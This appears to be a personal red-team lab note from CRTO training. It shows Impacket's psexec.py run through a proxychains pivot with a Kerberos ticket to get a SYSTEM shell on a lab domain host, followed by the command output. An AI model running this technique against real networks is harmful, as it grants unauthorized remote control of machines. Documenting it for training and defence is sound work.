
We can use `psexec.py` (another impacket tool) to get a SYSTEM shell. 

```
ubuntu@DESKTOP-3BSK7NO ~> proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
[*] Creating service msin on 10.10.122.30.....
[*] Starting service msin.....
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.10:88-<><>-OK
Microsoft Windows [Version 10.0.20348.887]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname && whoami
web
nt authority\system

```

### Properties
---
📆 created   {{17-02-2024}} 18:29
🏷️ tags: #redteam #crto 

---

